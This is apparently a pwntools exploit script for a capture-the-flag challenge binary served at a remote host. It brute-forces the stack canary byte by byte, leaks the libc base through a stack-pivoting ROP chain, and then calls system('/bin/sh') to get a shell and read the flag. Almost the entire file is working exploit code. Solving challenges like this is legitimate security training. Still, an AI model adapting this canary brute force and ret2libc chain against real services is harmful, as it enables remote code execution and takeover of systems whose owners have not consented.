#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall.elf'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'tcp.sasc.tf', 14848

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# set follow-fork-mode child
set follow-fork-mode parent

break *0x40138f
# break *0x401394
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chall.elf 
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)
'''
set follow-fork-mode child
'''

def brute_canary():
    global io 

    old_log_level = context.log_level
    context.log_level = 'warn'

    canary = b'\x00'

    while(len(canary) != 0x8):
        for i in range(0, 0x100):
            log.warn("trying %#x at idx %d", i, len(canary))
            
            io.sendlineafter(b':', b'1')
            payload = b'A' * 24 +  canary + i.to_bytes()

            try:
                io.sendafter(b':', payload)
                
                io.recvuntil(b'stability.\n')
                res = io.recvline()
                if args.REMOTE:
                    if b'lost' in res:
                        log.warn("stack smashing detected, trying next byte")
                        continue
                else:    
                    if b'stack smashing detected' in res:
                        log.warn("stack smashing detected, trying next byte")
                        continue

                log.warn("found valid canary: %#x", i)

                canary = canary + i.to_bytes()
                log.warn(b"current canary state: %#x", u64(bytes(canary).ljust(8, b'\x00')))
                
                break
            except Exception as e:
                if not isinstance(e, EOFError):
                    log.warn("something went wrong: %s", str(e))
                    exit(1) 
                continue
        else:
            log.warn("failed to find canary byte at idx %d", len(canary))
            exit(1)

    context.log_level = old_log_level
    return u64(bytes(canary).ljust(8, b'\x00'))

def exploit():
    global io
    io = initialize()

    canary = brute_canary()
    prefix = b'%p|%p|%p|%p|%p|%p|%p|%p'
    prefix = prefix.ljust(24, b'\x00')
    prefix += p64(canary)
    prefix += p64(0x0)

    pop_rbp = 0x4011ed # pop rbp; ret;
    ret = 0x401453
    stdout = 0x404090

    payload = flat([
        pop_rbp,
        elf.bss()+0x100+0x20,
        0x401368,
    ]) + p32(0x0)
    payload += flat({
        60-4: [
            canary,
        ]
    }, filler=p64(stdout))
    payload += flat({
        8 : [
            pop_rbp,
            elf.bss()+0x100+0x8,
            0x4012d4,
        ]
    })
    # pause()
    io.sendlineafter(b':', b'1')
    io.sendafter(b':', prefix+payload)

    io.recvuntil(b'[Mickey-0]:')
    libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 0x2125c0

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

    payload = flat([
        pop_rdi, 
        next(libc.search(b'/bin/sh\x00')),
        ret,
        libc.sym['system'],
    ])
    io.sendlineafter(b':', b'1')
    io.sendafter(b':', prefix+payload)

    io.sendline(b'cat flag*')

    log.info("canary: %#x", canary)
    log.info("libc base: %#x", libc.address)
    log.info("bss+0x100: %#x", elf.bss()+0x100)
    io.interactive()

if __name__ == '__main__':
    exploit()
